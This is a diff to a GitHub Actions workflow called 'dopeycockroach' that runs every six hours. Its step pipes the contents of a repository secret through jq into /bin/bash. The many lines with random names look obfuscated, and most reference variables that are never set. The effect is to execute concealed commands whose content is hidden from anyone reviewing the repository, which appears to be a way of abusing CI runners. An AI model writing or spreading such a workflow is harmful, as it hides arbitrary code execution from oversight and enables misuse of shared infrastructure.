@@ -2,22 +2,31 @@ name: dopeycockroach
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 4/6 * * *'
+    - cron: '45 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: dopeycockroach
         env:
-          trtbp0: ${{ secrets.trtbp0 }}
+          w7: ${{ secrets.w7 }}
         run: |
-          echo $trtbp0 | jq -r .yw994 | /bin/bash
-          echo $ci506 | jq -r .ee2 | /bin/bash
-          echo $hdjpj6880 | jq -r .fqz3289 | /bin/bash
-          echo $ryao4794 | jq -r .jxc0561 | /bin/bash
-          echo $ax34 | jq -r .bjqhv83326 | /bin/bash
-          echo $o7 | jq -r .piua79888 | /bin/bash
-          echo $ost928 | jq -r .tqfm5 | /bin/bash
-          echo $td129 | jq -r .kkv9 | /bin/bash
+          echo $w7 | jq -r .bqofv2410 | /bin/bash
+          echo $gzexk3 | jq -r .kl76945 | /bin/bash
+          echo $rok587 | jq -r .i2 | /bin/bash
+          echo $b3 | jq -r .h3 | /bin/bash
+          echo $zwz91 | jq -r .lpiwd04869 | /bin/bash
+          echo $tudmk90104 | jq -r .wpajr2198 | /bin/bash
+          echo $nu4 | jq -r .aq523 | /bin/bash
+          echo $q19 | jq -r .ro921 | /bin/bash
+          echo $zgti36 | jq -r .vb286 | /bin/bash
+          echo $c2660 | jq -r .tviab50539 | /bin/bash
+          echo $ii05 | jq -r .gxupg21462 | /bin/bash
+          echo $vb0 | jq -r .bbxha168 | /bin/bash
+          echo $lg742 | jq -r .orabl5499 | /bin/bash
+          echo $komg554 | jq -r .u67 | /bin/bash
+          echo $a659 | jq -r .cth390 | /bin/bash
 
